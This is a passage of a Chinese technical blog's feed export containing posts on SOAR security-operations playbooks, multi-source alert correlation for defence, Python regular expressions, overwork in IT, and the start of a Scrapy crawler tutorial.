alt="重保HW事件处置流程"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>安全监控员</td><td>能够初步判断安全事件影响范围及基本的应急处理措施完成简单安全事件的处置工作，督促业务部门完成安全事件处置，做好安全事件处置的全流程管控</td><td></td></tr><tr><td>2</td><td>研判组</td><td>能够根据安全数据上下文判断安全事件的可信度及影响范围，能够利用各种手段开展攻击溯源及应急响应</td><td>完成复杂安全事件的研判工作，为一线监控人员提供技术指导</td></tr><tr><td>3</td><td>处置组</td><td>对IP进行封堵响应处置。</td><td>完成IP地址封堵操作</td></tr></tbody></table><p>因为SOAR具有灵活定义剧本的能力，在实际的运营中可以根据自身企业的实际情况，为自身企业量身定制符合自身管理制度要求和人员配置情况的安全运营剧本流程，除了事件处置以外还可以编排如资产稽核管理剧本、暴露面清查剧本、漏洞管理剧本、安全设备巡检剧本等等。</p><h3 id="相关制度要求"><a href="#相关制度要求" class="headerlink" title="相关制度要求"></a>相关制度要求</h3><p>(一)  企业应建立7*24小时网络安全监测和处置机制，对所辖网络设备和系统平台开展监测，对重要系统应开展专项监测，将安全监测和事件处置统一纳入安全运营中心，事件处置统一由SOAR安全事件编排自动化响应进行处置。</p><p>(二)  应将安全工单纳入SOAR工单管控体系。安全运营支撑单位督促安全工单各环节责任人响应和处置,按流程进行超时工单升级，开展工单闭环管控。</p><p>(三)  安全运营支撑单位应优化安全监控手段，按月开展告警分析，优化安全设备和平台告警规则，持续提升安全告警准确率。</p><p>(四)  安全运营支撑单位应持续关注内外部威胁情报，实时发布威胁预警，提供处置建议和技术支撑，跟踪问题解决,安全运营维护单位应及时评估威胁影响，根据处置建议制定处置方案并实施。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SOAR是最近几年安全市场上最火热的词汇之一。各个安全产商都先后推出了相应的产品，但大部分都用得不是很理想。SOAR不同与传统的安全设备，买来后实施部署就完事，SOAR是一个安全运营系统，是实现安全运营过程中人、工具、流程的有效协同，提高安全运营效率的平台。核心在于运营，在
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>告警繁杂迷人眼，多源分析见月明</title>
    <link href="https://xiejava.gitee.io/posts/1934f640/"/>
    <id>https://xiejava.gitee.io/posts/1934f640/</id>
    <published>2023-10-07T11:37:30.000Z</published>
    <updated>2023-10-07T11:53:30.812Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/1-%E5%91%8A%E8%AD%A6%E7%B9%81%E6%9D%82%E8%BF%B7%E4%BA%BA%E7%9C%BC.png" alt="告警繁杂迷人眼"></p><p>随着数字化浪潮的蓬勃兴起，网络安全问题日趋凸显，面对指数级增长的威胁和告警，传统的安全防御往往力不从心。网内业务逻辑不规范、安全设备技术不成熟都会导致安全设备触发告警。如何在海量众多安全告警中识别出真正的网络安全攻击事件成为安全运营的痛点问题。传统的分析手段，没有从威胁来源和攻击者视角来分析问题，从黑客攻击杀伤链来看，检测点和分析手段严重不足。因此需要从<strong>多源安全信息数据融合分析，实现网络攻击精准研判和处置</strong>。</p><p>从黑客攻击的视角，攻击手段多样，往往是多点突破，层层渗透。因此需要根据纵深防御的思路，在网络的出入口、在应用层、在主机层都要部署相应的安全防护检测设备。如：在企业互联网边界出口部署全流量监测设备，分析获取隐藏在流量中的恶意行为；在应用层部署WAF，分析应用层的攻击行为；在主机层面部署EDR，分析主机层面的异常行为。以攻击者的视角从网络攻击路径出发，对网络层、应用层、主机层的多源安全告警进行联动分析，精准确定安全攻击事件。</p><p>具体分析方法如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/2-%E5%A4%9A%E6%BA%90%E6%95%B0%E6%8D%AE%E8%9E%8D%E5%90%88%E5%88%86%E6%9E%90%E7%A0%94%E5%88%A4%E6%80%9D%E8%B7%AF.png" alt="多源数据融合分析精准研判思路"><center>多源数据融合分析精准研判思路</center></p><p><strong>1、多源数据采集</strong>。对全流量、WAF、主机安全等检测设备的告警数据进行采集，从告警数据中分析出攻击源IP、目的IP、源端口、目的端口、告警内容、告警级别、载荷信息等有效信息。并对告警数据过滤降噪，首先将源IP、目的IP、源端口、目的端口、告警内容相同的重复告警，以及告警级别为提醒的告警过滤掉。对剩下的告警进行针对性分析，针对告警级别为严重或致命的告警，根据告警内容和载荷信息筛选出潜在的针对性攻击。</p><p><strong>2、多源数据关联分析</strong>。总结人工研判经验，制定分析模型。如在不同层面的安全设备告警日志中发现相同的攻击源IP和目的IP在同一个时间段都产生了安全告警，说明既在网络侧发现了攻击行为又在应用侧和主机侧发现了攻击行为，通过不同层面告警数据的关联分析和交叉验证，可以确定该攻击是属于高可信的安全攻击事件。</p><p><strong>3、封堵处置，对攻击源进行封堵</strong>。为了避免错误的封堵影响业务，对源IP结合资产台账、黑白名单、情报数据等进行分析过滤，确定不会影响到业务后进行封堵处置。</p><p> 安全以“检测”为始，以“处置”为终。在攻击者对目标系统造成最终损害之前，制止损害或降低损失是信息安全体系的最终防线，也是及时响应的目标。以攻击者的视角从网络攻击的路径出发，对网络层、应用层、主机层的多源安全告警进行关联分析，精准确定安全攻击事件。在实战中，可通过以数据和情报驱动，采用自适应安全架构，嵌入工具、流程和策略来对抗新一代威胁。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/1-%E5%91%8A%E8%AD%A6%E7%B9%81%E6%9D%82%E8%BF%B7%E4%BA%BA%E7%
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python与正则表达式</title>
    <link href="https://xiejava.gitee.io/posts/994a1838/"/>
    <id>https://xiejava.gitee.io/posts/994a1838/</id>
    <published>2023-10-06T11:44:35.000Z</published>
    <updated>2023-10-06T11:49:24.714Z</updated>
    
    <content type="html"><![CDATA[<p>我们在做机器学习项目的时候，很大部分的精力都在做数据的整理，不管是用爬虫在网上爬取数据还是对已有的数据进行整理，往往需要对一些特定的字符串进行处理，正则表达式则是进行数据处理的利器。</p><h2 id="一、什么是正则表达式"><a href="#一、什么是正则表达式" class="headerlink" title="一、什么是正则表达式"></a>一、什么是正则表达式</h2><p>正则表达式，又称规则表达式,（Regular Expression，在代码中常简写为regex、regexp或RE），是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”），是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串，通常被用来检索、替换那些符合某个模式（规则）的文本。正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p><p>简单来说，正则表达式就是使用：字符串定义规则，并通过规则去验证字符串是否匹配。<br>比如，验证一个字符串是否是符合条件的电子邮箱地址，只需要配置好正则规则，即可匹配任意邮箱。</p><p>比如通过正则规则： <code>(^[\w-]+(.[\w-]+)*@[\w-]+(.[\w-]+)+$)</code>  即可匹配一个字符串是否是标准邮箱格式。但如果不使用正则，使用if else来对字符串做判断就非常困难了。</p><h2 id="二、Python中如何使用正则表达式"><a href="#二、Python中如何使用正则表达式" class="headerlink" title="二、Python中如何使用正则表达式"></a>二、Python中如何使用正则表达式</h2><p>正则表达式的使用分两部分，一是编写模式（规则）文本，也就是正则表达式；二是通过具体的编程语言来使用正则表达式进行使用，在Python语言中通过re 模块使 Python 语言拥有全部的正则表达式功能。</p><h3 id="1、正则表达式模式的编写"><a href="#1、正则表达式模式的编写" class="headerlink" title="1、正则表达式模式的编写"></a>1、正则表达式模式的编写</h3><p>模式字符串使用特殊的语法来表示一个正则表达，由一些普通字符和一些元字符（metacharacters）组成。</p><p>字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。<br>多数字母和数字前加一个反斜杠时会拥有不同的含义。<br>标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。<br>反斜杠本身需要使用反斜杠转义。</p><p>普通字符包括大小写的字母和数字，而元字符则具有特殊的含义，在最简单的情况下，一个正则表达式看上去就是一个普通的字符串。例如，正则表达式<code>&quot;xiejava&quot;</code>中没有包含任何元字符，它可以匹配<code>&quot;xiejava&quot;</code>和<code>&quot;xiejava1018&quot;</code>等字符串，但是不能匹配<code>&quot;XieJava&quot;</code>。</p><p>在刚刚我们只是进行了基础的字符串匹配，正则最强大的功能在于元字符匹配规则，常见的元字符匹配规则如下：</p><ul><li>单字符匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>.</td><td>匹配任意1个字符(除了\n) , .匹配点本身</td></tr><tr><td>[ ]</td><td>匹配[]中列举的字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于 [0-9]</td></tr><tr><td>\D</td><td>匹配任意非数字</td></tr><tr><td>\s</td><td>匹配任意空白字符，即空格、tab键，等价于 [\t\n\r\f]</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\w</td><td>匹配单词字符，即a-z、A-Z、0-9、</td></tr><tr><td>\W</td><td>匹配非单词字符</td></tr></tbody></table><ul><li>数量匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>匹配前一个规则的字符出现0至无数次</td></tr><tr><td>+</td><td>匹配前一个规则的字符出现1至无数次</td></tr><tr><td>？</td><td>匹配前一个规则的字符出现0次或1次</td></tr><tr><td>{m}</td><td>匹配前一个规则的字符出现m次</td></tr><tr><td>{m,}</td><td>匹配前一个规则的字符出现最少m次</td></tr><tr><td>{m,n}</td><td>匹配前一个规则的字符出现m到n次</td></tr></tbody></table><ul><li>边界匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td></tr><tr><td>\b</td><td>匹配一个单词的边界</td></tr><tr><td>\B</td><td>匹配非单词边界</td></tr></tbody></table><ul><li>分组匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>|</td><td>匹配左右任意一个表达式</td></tr><tr><td>（）</td><td>将括号中字符作为一个分组</td></tr></tbody></table><p><strong>示例：</strong><br>匹配账号，只能由字母和数字组成，长度限制6到10位<br>规则为： <code>[0-9a-zA-Z]{6, 10}$</code></p><p>匹配QQ号，要求纯数字，长度4-10，第一位不为0<br>规则为：<code>[1-9][0-9]{4, 10}</code><br>[1-9]匹配第一位，[0-9]匹配后面4到10位</p><p>匹配邮箱地址，只允许qq、163、189这三种邮箱地址<br>规则为：<code>[a-zA-Z0-9_.]+@[qq|163|189]+[.a-zA-Z]+</code></p><h3 id="2、Python中re模块的基础使用"><a href="#2、Python中re模块的基础使用" class="headerlink" title="2、Python中re模块的基础使用"></a>2、Python中re模块的基础使用</h3><p>Python中re模块常用的正则表达式包括以下四个主要方法：</p><ul><li><strong>使用match()进行准确匹配</strong><br>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">account_pattern=<span class="string">'^[0-9a-zA-Z]&#123;6,9&#125;$'</span></span><br><span class="line"></span><br><span class="line">account_str1=<span class="string">'xiejava1018'</span></span><br><span class="line">account_str2=<span class="string">'xiejava'</span></span><br><span class="line">account_str3=<span class="string">'xie'</span></span><br><span class="line"></span><br><span class="line">result1=re.match(account_pattern,account_str1)</span><br><span class="line">print(result1)</span><br><span class="line">result2=re.match(account_pattern,account_str2)</span><br><span class="line">print(result2)</span><br><span class="line">result3=re.match(account_pattern,account_str3)</span><br><span class="line">print(result3)</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">7</span>), match=<span class="string">'xiejava'</span>&gt;</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>匹配成功 re.match 方法返回一个匹配的对象，否则返回 None。<br>我们可以使用 group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group())</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiejava</span><br></pre></td></tr></table></figure><ul><li><strong>使用search()首次匹配查找</strong><br>match()方法是从字符串的开头开始匹配，一旦起始位置不匹配，match() 就返回 none，整个匹配就失败了，它更适合用来检验某个字符串是否符合某个正则表达式的规则。常用来做格式的校验。如要实现在一段文本中查找符合正则表达式的字符串，可以用re.search()，它扫描整个字符串并返回第一个成功的匹配。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qq_pattern = <span class="string">'[1-9][0-9]&#123;4,10&#125;'</span></span><br><span class="line"></span><br><span class="line">qq_str1=<span class="string">'我的QQ号是:4002692和3641250'</span></span><br><span class="line"></span><br><span class="line">result_qq_match=re.match(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_match)</span><br><span class="line">result_qq_search=re.search(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_search)</span><br><span class="line"><span class="keyword">if</span> result_qq_search:</span><br><span class="line">    print(result_qq_search.group())</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">7</span>, <span class="number">14</span>), match=<span class="string">'4002692'</span>&gt;</span><br><span class="line"><span class="number">4002692</span></span><br></pre></td></tr></table></figure><p>在这可以看出，match()因为是起始位置匹配所以QQ号4002692没有匹配上，而search()它是扫描整个字符串找到第一个匹配成功的就返回了，实际上在这个例子中还有个3641250的QQ号。如果要找到所有的匹配就要用到re.findall()方法了。</p><ul><li><strong>使用findall()所有匹配查找</strong><br>findall()在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果有多个匹配模式，则返回元组列表，如果没有找到匹配的，则返回空列表。<br>注意： match 和 search 是匹配一次 findall 匹配所有。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result_qq_findall=re.findall(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_findall)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'4002692'</span>, <span class="string">'3641250'</span>]</span><br></pre></td></tr></table></figure><p>可以看到通过re.findall()方法匹配到了两个QQ号。</p><ul><li><strong>使用sub()匹配替换</strong><br>在做数据处理的时候，经常碰到的场景是找到某个匹配项，替换成一个新的字符串。这时就可以用到re.sub()进行匹配替换了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">email_pattern=<span class="string">'[a-zA-Z0-9_\.]+@[qq|163|189]+[\.a-zA-Z]+'</span></span><br><span class="line">email_str1=<span class="string">'我的email是：xiejava@qq.com、xiejava1018@163.com、xiejava@189.com、xiejava@sohu.com'</span></span><br><span class="line">result_email_findall=re.findall(email_pattern,email_str1)</span><br><span class="line">print(result_email_findall)</span><br><span class="line">email_str2=re.sub(<span class="string">'[a-zA-Z0-9_\.]+@'</span>,<span class="string">'****@'</span>,email_str1)</span><br><span class="line">print(email_str2)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'xiejava@qq.com'</span>, <span class="string">'xiejava1018@163.com'</span>, <span class="string">'xiejava@189.com'</span>]</span><br><span class="line">我的email是：****@qq.com、****@<span class="number">163.</span>com、****@<span class="number">189.</span>com、****@sohu.com</span><br></pre></td></tr></table></figure><p>在这里可以看到，我们通过re.findall()匹配到了qq、163、189的邮箱。通过re.sub()将所有的邮箱的账号匹配后替换成了****进行脱敏处理。</p><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：</p><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td>re.I</td><td>使匹配对大小写不敏感</td></tr><tr><td>re.L</td><td>做本地化识别（locale-aware）匹配</td></tr><tr><td>re.M</td><td>多行匹配，影响 ^ 和 $</td></tr><tr><td>re.S</td><td>使 . 匹配包括换行在内的所有字符</td></tr><tr><td>re.U</td><td>根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td></tr><tr><td>re.X</td><td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td></tr></tbody></table><p>使用实例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match_pattern=<span class="string">'xiejava'</span></span><br><span class="line"></span><br><span class="line">account_str1=<span class="string">'XieJava is xiejava'</span></span><br><span class="line">result1=re.match(match_pattern,account_str1)</span><br><span class="line">print(result1)</span><br><span class="line">result2=re.match(match_pattern,account_str1,re.I)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">7</span>), match=<span class="string">'XieJava'</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看到在没有指定re.I的时候没有匹配到XieJava，指定re.I后使匹配对大小写不敏感，可以匹配到Xiejava</p><h2 id="三、正则表达式的应用"><a href="#三、正则表达式的应用" class="headerlink" title="三、正则表达式的应用"></a>三、正则表达式的应用</h2><p>给定一个正则表达式和另一个字符串，我们可以达到如下的目的：</p><ol><li><p>判断给定的字符串是否符合正则表达式的过滤逻辑（称作“匹配”）<br>应用场景为格式效验，如身份证、Email、手机号码的数据效验等。</p></li><li><p>可以通过正则表达式，从字符串中获取我们想要的特定部分<br>应用场景如：爬虫程序爬取数据时进行信息的提取，从文本中提取特定的部分。</p></li><li><p>可以通过正则表示式进行查找替换，将字符串中符合匹配条件的项替换成特定的字符<br>应用场景如：机器学习中的数据清洗整理，将某些数据进行查找替换等。</p></li></ol><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们在做机器学习项目的时候，很大部分的精力都在做数据的整理，不管是用爬虫在网上爬取数据还是对已有的数据进行整理，往往需要对一些特定的字符串进行处理，正则表达式则是进行数据处理的利器。&lt;/p&gt;
&lt;h2 id=&quot;一、什么是正则表达式&quot;&gt;&lt;a href=&quot;#一、什么是正则表达式&quot;
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>连续加班几个月，放假还要带电脑，我在思考工作的意义</title>
    <link href="https://xiejava.gitee.io/posts/3cd9fb5d/"/>
    <id>https://xiejava.gitee.io/posts/3cd9fb5d/</id>
    <published>2023-09-30T03:06:45.000Z</published>
    <updated>2023-09-30T03:31:11.414Z</updated>
    
    <content type="html"><![CDATA[<p>对于了解IT这个行业的人来说，这个行业的内卷程度超乎了大家的想像，工作真的很累，加班已经成为整个行业的标签。不管是去哪里笔记本电脑都得随身带，就像随时待命的特种兵，接到命令随时马上要展开战斗。有的时候在系统出事或者需求比较紧急的时候，无论哪里都会成为工作场所，可能旅游景点、可能是商场、可能是高铁地铁上、也有可能是路边……</p><p>在线系统出bug了他们就是救火员！想必很多人都经历过系统上线后匆忙处理bug，这种时候，就不分周末还是工作日了，更不管白天还是黑夜干就对了！有网友分享了这“经典”的一幕，一天晚上9点多，北京地铁某号线上，这位网友刚下站就看见一个小伙子蹲坐在一个隐蔽的角落，旁边地上放着双肩包，屏幕亮着，小伙正在专心地敲代码。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230930/%E7%A8%8B%E5%BA%8F%E5%91%98%E8%B7%AF%E8%BE%B9%E6%95%B2%E4%BB%A3%E7%A0%81%E6%94%B9bug.png" alt="程序员路边敲代码改bug"></p><p>作为IT从业者深刻感受到行业之卷，而对于运营商中搞网络安全的从业人员来说那更是“卷王之王”。各种实战演练活动、各种重保活动、安全运营监控值守、各种突发事件应急处置等。连续加班了好几个月，到了国庆假期还得要带上笔记本电脑，生怕有电话进来，基本上没有什么生活质量可言。这段时间，每天早上起床的第一件事就是问自己“<strong>这就是我想要的生活吗？</strong>”，为此我在思考和寻找工作的意义。</p><p>人的本性是趋利避害的，工作这事，本身是违背人本性的——无论什么工作，只要是投入劳力与时间换取物质资料，但在这个时代，工作又是人类最高效的自我满足手段——物质和精神，都是如此。</p><p>在《商业模式新生代-个人篇》介绍了工作的四种意义：</p><ul><li><p>工作是谋生手段<br>它意味着为了收入而工作，不涉及多少个人因素或满足感。工作即一种实用性活动，就是说完成某事的主要目的是为了得到另一件事。当然作为谋生手段的工作也能产生宝贵的技能和满足感，但其主要目的还是为工作者提供生存基础以追求生活中其他方面的意识。</p></li><li><p>工作是发展方向<br>将工作视为职业，这种观点的前提是工作者的动力源自对成功、成就和身份地位的渴望。此类工作者对工作的态度并不是热情眷恋，而是强调努力工作对自我的回馈，对职业型工作者来说，工作是一种创造、定义、表达、证明和美化自我的方式。将工作视为发展方向是实现人生意义和获得满足感的一个重要来源。</p></li><li><p>工作是使命召唤<br>“天职”这个词源自“天将降大任于斯人也”这一理念。这种“天意”可以是外在动力，如上帝的旨意或社区的需要；也可以是内在动力，如需要向世人展现的天赋使命。这种工作强调的是“个人的义务、责任或使命”。在那个激情燃烧的时代，为社会主义事业奋斗终生是我们的使命召唤；在百年未有之大变局的新时代，突破高科技技术封锁，实现中华民族的伟大复兴是我们的使命召唤。</p></li><li><p>工作是自我实现<br>它一方面体现了工作高度强调兴趣驱动的特征，另一方面淡化了咄咄逼人的“天命”特征。追求自我实现的工作者会选择不同寻常的职业道路，这些选择强调的是个人兴趣而非经济回报或名声威望。这种思考方式也是获得人生意义的一个重要来源。视工作为“自我实现”的人相对来说工作生活更为平衡，他们可以在工作中实现更多的人生意义，同时也不会牺牲家庭欢乐和其他方面的兴趣。</p></li></ul><p><strong>工作对不同的人来说具有不同的意义，工作的意义在很大程度上决定着“我是谁”这个命题的答案。</strong></p><ul><li><p>工作只是生活的手段，享受生活才是目的<br>工作是为了更好的生活，它的本质是交换，我们付出时间、经验，换取一部分我们想要的生活自由。我们已经很幸运，大部分的人都能有一份安稳的工作作为谋生手段。不要在谋生的地方找意义，生活才是实现意义的地方。</p></li><li><p>工作之外的你，才是真正不可替代的<br>我们这一生扮演的很多角色都是不可替代的，贴心的朋友、孝顺的子女、操心的家长。唯独工作是可以被替代的，如果你不干这些工作，依然有会有人干。与其把时间都投入到工作中内卷、焦虑、失眠，不如多花时间陪伴家人和朋友。 下班后该玩儿就玩儿，就陪家人就陪家人，把精力分散，而不是用下班时间去焦虑工作，还把这种内耗带到家里。你去运动、去做饭、去旅游、去亲近自然、去看一看花开日落、去体会一下风土人情。</p></li></ul><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;对于了解IT这个行业的人来说，这个行业的内卷程度超乎了大家的想像，工作真的很累，加班已经成为整个行业的标签。不管是去哪里笔记本电脑都得随身带，就像随时待命的特种兵，接到命令随时马上要展开战斗。有的时候在系统出事或者需求比较紧急的时候，无论哪里都会成为工作场所，可能旅游景点、
      
    
    </summary>
    
    
      <category term="人生" scheme="https://xiejava.gitee.io/categories/%E4%BA%BA%E7%94%9F/"/>
    
    
      <category term="自我管理" scheme="https://xiejava.gitee.io/tags/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy爬虫框架实战</title>
    <link href="https://xiejava.gitee.io/posts/dfc313ee/"/>
    <id>https://xiejava.gitee.io/posts/dfc313ee/</id>
    <published>2023-09-12T15:00:02.000Z</published>
    <updated>2023-09-12T15:15:42.188Z</updated>
    
    <content type="html"><![CDATA[<p>Python实现爬虫是很容易的，一般来说就是获取目标网站的页面，对目标页面的分析、解析、识别，提取有用的信息，然后该入库的入库，该下载的下载。以前写过一篇文章<a href="http://xiejava.ishareread.com/posts/eab21fe5/" target="_blank" rel="noopener">《Python爬虫获取电子书资源实战》</a>，以一个电子书的网站为例来实现python爬虫获取电子书资源。爬取整站的电子书资源，按目录保存到本地，并形成索引文件方便查找。这次介绍通过Scrapy爬虫框架来实现同样的功能。</p><h2 id="一、Scrapy简介"><a href="#一、Scrapy简介" class="headerlink" title="一、Scrapy简介"></a>一、Scrapy简介</h2><p>Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。<br>Scrapy 常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。<br>通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/1-scrapy%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt="Scrapy爬虫框架"></p><ul><li>Scrapy Engine(引擎)：负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。</li><li>Scheduler(调度器)：它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</li><li>Downloader(下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy 